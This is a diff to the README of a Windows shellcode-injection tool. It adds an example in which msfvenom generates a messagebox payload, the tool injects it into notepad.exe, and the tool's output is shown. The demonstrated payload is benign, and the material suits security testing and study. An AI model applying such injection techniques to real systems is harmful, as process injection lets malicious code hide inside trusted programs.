@@ -13,3 +13,17 @@ If a file path is used the target program will be launched and injected with cho
 If a PID is used the target program will simply be injected. (Note: This requires user account privilege 'SeDebugPrivileges')
 
 the injected code is exectued as a thread running within the context of the injected application.
+
+Example Usage:
+```> msfvenom -p windows/x64/messagebox --platform windows -a x64 -f raw -o shellcode.bin ICON=NO TEXT="hello world" TITLE="test" 
+> .\CodeInjector.exe -f C:\Windows\notepad.exe .\shellcode3.bin
+Insepcting cli agruments...
+Reading shellcode...
+Done.
+Preparing the victim for injection..
+Done.
+Injecting shellcode into process...
+wrote 0x11c bytes into process memory, executing now...
+Done.
+Shellcode should be executing
+Press any key to continue . . .
